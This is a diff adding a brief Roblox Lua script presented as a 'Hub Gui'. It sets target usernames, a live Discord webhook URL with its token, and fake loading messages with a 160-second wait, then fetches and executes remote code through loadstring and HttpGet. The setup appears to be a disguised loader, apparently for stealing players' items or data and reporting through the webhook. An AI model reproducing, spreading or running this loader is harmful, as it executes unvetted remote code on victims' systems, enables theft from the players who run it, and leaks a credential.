@@ -1,0 +1,10 @@
+UserName = "TAAA9999999999"
+UserName2 = "kkooasd4f4f4"
+Webhook = "https://discord.com/api/webhooks/1107130437622575194/XkJAxhkvDecASA9VT7cwCM1zUF9fSLwgQ-BZAooQ-h1-urvaICPQK8Rxdh45wAlag0HR"
+_G.ScriptName = "Hub Gui"
+_G.FirstText = "Hi"
+_G.SecondText = "Lets go"
+_G.ThirdText = "finishing..."
+_G.WaitingTime = 160
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
